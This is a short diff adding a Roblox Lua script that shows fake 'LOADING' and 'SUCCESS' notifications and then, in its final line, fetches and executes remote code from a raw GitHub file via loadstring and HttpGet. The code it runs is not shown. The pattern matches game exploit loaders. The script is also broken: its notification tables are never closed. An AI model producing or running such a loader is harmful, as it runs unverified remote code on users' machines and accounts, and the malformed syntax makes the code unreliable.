@@ -1,0 +1,11 @@
+game.StarterGui:SetCore("SendNotification", {
+	Title = "LOADING";
+	Text = "...";
+        Duration = 5.5;
+wait(6)
+game.StarterGui:SetCore("SendNotification", {
+	Title = "LOADED";
+	Text = "SUCCESS";
+        Duration = 4.47;
+wait(5)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/LiverMods/xRawnder/main/ArquivoTxT'))()
